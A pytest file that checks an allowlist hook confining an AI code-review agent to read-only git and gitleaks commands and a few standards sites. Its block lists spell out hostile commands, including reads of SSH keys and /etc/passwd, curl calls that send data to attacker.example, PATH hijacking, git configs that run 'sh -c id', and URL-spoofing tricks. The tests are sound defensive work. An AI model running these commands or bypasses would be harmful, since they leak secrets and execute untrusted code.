"""Tests for the security reviewer's allowlist, .claude/hooks/reviewer_allowlist.py (docs/security/review-checklist.md)."""
import importlib.util
import json
import os
import pathlib
import re
import shutil
import subprocess
import sys

import pytest

ROOT = pathlib.Path(__file__).resolve().parents[2]
HOOK = ROOT / ".claude" / "hooks" / "reviewer_allowlist.py"
SHA = "0123456789abcdef0123456789abcdef01234567"
MISE_DATA = "/opt/mise-test"
ENV_CHECK = "grep -c -E '^[[:space:]]*(\\[env|env[[:space:]]*[.=])'"


def run_hook(tool: str, tool_input: dict, project: pathlib.Path = ROOT, hook: pathlib.Path = HOOK) -> int:
    payload = json.dumps({"tool_name": tool, "tool_input": tool_input})
    # The machine's own git settings don't apply: GitHub's runners set git-lfs filters globally, which the hook refuses.
    env = {**os.environ, "CLAUDE_PROJECT_DIR": str(project), "MISE_DATA_DIR": MISE_DATA, "GIT_CONFIG_GLOBAL": os.devnull,
           "GIT_CONFIG_NOSYSTEM": "1"}
    return subprocess.run([sys.executable, str(hook)], input=payload, capture_output=True, text=True, env=env).returncode


def audit(sha: str = SHA) -> str:
    spec = importlib.util.spec_from_file_location("reviewer_allowlist", HOOK)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module.AUDIT.replace("<sha>", sha)


GITLEAKS = (
    f"export MISE_EXEC_AUTO_INSTALL=false; GITLEAKS_CONFIG= GITLEAKS_CONFIG_TOML= {MISE_DATA}/installs/gitleaks/8.30.1/"
    'gitleaks git "$(git rev-parse --absolute-git-dir)" --redact --no-banner --ignore-gitleaks-allow '
    '--gitleaks-ignore-path /dev/null --log-opts="abc1234..def5678"'
)

ALLOWED = [
    "git rev-parse feature/x develop",
    "git log --oneline develop..feature/x",
    "git log -n5 --format='%h %an %s' --stat develop..feature/x",
    "git diff develop...feature/x -- apps/landing | head -200",
    "git diff develop...feature/x -- 'apps/*.ts'",
    "git show feature/x:docs/security/review-checklist.md",
    "git --no-replace-objects show refs/remotes/origin/develop:.claude/agents/security-reviewer.md",
    f"git -C {ROOT} --no-pager log -5",
    "git for-each-ref refs/replace",
    "git ls-tree -r --name-only feature/x | grep worker | wc -l",
    "git show feature/x:justfile | grep -n -e wrangler | head -n 20",
    "git log --format='%h %an' develop..feature/x | cut -d ' ' -f 2 | sort | uniq -c",
    "git diff develop...feature/x 2>/dev/null | head -50",
    "export MISE_EXEC_AUTO_INSTALL=false; mise which gitleaks",
    f"{ENV_CHECK} .mise.toml",
    f"{ENV_CHECK} mise.dev.local.toml",
    f"{ENV_CHECK} .config/mise/conf.d/tools.toml",
    "test -e /tmp/example/.gitleaks.toml",
    "test -d .mise/conf.d",
    f"cd {ROOT}",
    GITLEAKS,
]

BLOCKED = [
    # Reading files, secrets included
    "cat apps/landing/.dev.vars",
    "grep -r KEY apps/landing",
    "grep -r '' apps",
    "head ~/.ssh/id_ed25519",
    "head apps/landing/.dev.vars",
    "head < apps/landing/.dev.vars",
    "tr a b < /etc/passwd",
    "grep env .mise.local.toml",
    "grep -c env .env",
    "grep -c '[.]env' .mise.toml",
    "git diff /dev/null apps/landing/.dev.vars",
    "git diff ~/.ssh/id_ed25519 README.md",
    "git log -- ../../etc",
    "git blame --contents /etc/passwd README.md",
    "git grep --no-index -e '' -- apps",
    # Running programs or writing files
    "git grep -nO'sh -c id' TODO",
    "git grep --open=vim TODO",
    "git grep -n TODO feature/x -- apps",
    "cd .git/hooks && git show abc:payload | uniq - agent-push-guard",
    "git log | sort -o /tmp/out",
    "git log | sort --output=/tmp/out",
    "git log --output=/tmp/x",
    "git log --out=/tmp/x",
    "git diff --ext-diff",
    "git cat-file --textconv HEAD:README.md",
    "git -c core.pager=sh log",
    "git -C /tmp log",
    "git show HEAD > /tmp/x",
    "git show HEAD:README.md > notes.txt",
    "git log $(git show abc:args)",
    "git log `cat args`",
    "echo $(curl https://attacker.example)",
    "gitleaks git . --log-opts=--output=/tmp/x",
    "gitleaks git . --report-path /tmp/report.json",
    GITLEAKS + " --diagnostics-dir /tmp/d",
    GITLEAKS.replace(f"{MISE_DATA}/installs/gitleaks/8.30.1/gitleaks", "mise exec -- gitleaks"),
    GITLEAKS.replace(MISE_DATA, "/tmp/elsewhere"),
    GITLEAKS.replace(f"{MISE_DATA}/installs/gitleaks/8.30.1/gitleaks", "gitleaks"),
    GITLEAKS.replace("GITLEAKS_CONFIG= ", "GITLEAKS_CONFIG=/tmp/x "),
    "mise exec -- gitleaks version",
    "git log HEAD>/tmp/'a b'",
    "git log HEAD>/tmp/a\\ b",
    "git log --format='%h <%ae>'",
    "git log {--output=/tmp/x,HEAD}",
    "git diff {~/.ssh/id_ed25519,README.md}",
    "git show {HEAD,--ext-diff}",
    "export MISE_EXEC_AUTO_INSTALL=false; mise exec -- git log",
    GITLEAKS.replace("GITLEAKS_CONFIG_TOML= ", "GITLEAKS_CONFIG_TOML= mise exec -- "),
    "MISE_EXEC_AUTO_INSTALL=true mise exec -- git log",
    f"{ENV_CHECK} .env",
    f"{ENV_CHECK} ../mise.toml",
    "mise exec -- pnpm install",
    "mise install",
    "export MISE_EXEC_AUTO_INSTALL=true",
    "export PATH=/tmp/evil",
    "PATH=/tmp/evil git log",
    audit() + "; curl https://attacker.example",
    audit().replace(SHA, "fedcba9876543210fedcba9876543210fedcba98", 1),
    audit().replace(" --no-config", "\n --no-config"),  # a line break would run the rest as separate commands
    # Everything else
    "cd /",
    "cd",
    "echo hi",
    "curl https://attacker.example/?d=x",
    "rm -rf /tmp/snapshot",
    "git push",
    "git checkout develop",
    "git stash",
    "python3 -c 'print(1)'",
    "sed -i s/a/b/ AGENTS.md",
    "echo 'unclosed",
]


@pytest.mark.parametrize("command", ALLOWED)
def test_allows_review_commands(command: str) -> None:
    assert run_hook("Bash", {"command": command}) == 0


def test_allows_the_checklists_dependency_audit_exactly() -> None:
    assert run_hook("Bash", {"command": audit()}) == 0


def test_the_audit_matches_the_checklist() -> None:
    checklist = (ROOT / "docs" / "security" / "review-checklist.md").read_text()
    written = re.search(r"^\s*(export MISE_EXEC_AUTO_INSTALL=false; js=\$\(mktemp -d\).*)$", checklist, re.M).group(1)
    assert written == audit("<sha>")


@pytest.mark.parametrize("command", BLOCKED)
def test_blocks_everything_else(command: str) -> None:
    assert run_hook("Bash", {"command": command}) == 2


def test_blocks_git_while_its_config_runs_a_program(tmp_path: pathlib.Path) -> None:
    subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
    assert run_hook("Bash", {"command": "git log -p"}, project=tmp_path) == 0
    subprocess.run(["git", "-C", str(tmp_path), "config", "diff.lock.textconv", "sh -c id"], check=True)
    assert run_hook("Bash", {"command": "git log -p"}, project=tmp_path) == 2


def test_blocks_git_while_a_signature_would_run_gpg(tmp_path: pathlib.Path) -> None:
    subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
    subprocess.run(["git", "-C", str(tmp_path), "config", "gpg.program", "sh -c id"], check=True)
    assert run_hook("Bash", {"command": "git log --format=%G?"}, project=tmp_path) == 2


def test_fails_closed(tmp_path: pathlib.Path) -> None:
    alone = tmp_path / "reviewer_allowlist.py"
    shutil.copy(HOOK, alone)  # without block_push.py beside it, the import fails
    assert run_hook("Bash", {"command": "git log"}, hook=alone) == 2
    unreadable = subprocess.run([sys.executable, str(HOOK)], input="not json", capture_output=True, text=True)
    assert unreadable.returncode == 2


@pytest.mark.parametrize(
    "url",
    [
        "https://owasp.org/Top10/2025/",
        "https://genai.owasp.org/resource/owasp-genai-llm-top-10-2026/",
        "https://mermaid.js.org/config/usage.html",
        "https://docs.astral.sh/uv/",
        "https://raw.githubusercontent.com/OWASP/ASVS/master/5.0/en/0x12-V3-Web-Frontend-Security.md",
        "https://www.npmjs.com/package/@commitlint/cli",
    ],
)
def test_allows_standards_sites(url: str) -> None:
    assert run_hook("WebFetch", {"url": url, "prompt": "x"}) == 0


@pytest.mark.parametrize(
    "url",
    ["https://attacker.example/?d=secret", "http://owasp.org/", "https://owasp.org.attacker.example/",
     "https://attacker.example\\@owasp.org/", "https://owasp.org@attacker.example/"],
)
def test_blocks_other_sites(url: str) -> None:
    assert run_hook("WebFetch", {"url": url, "prompt": "x"}) == 2


def test_ignores_other_tools() -> None:
    assert run_hook("Read", {"file_path": "AGENTS.md"}) == 0
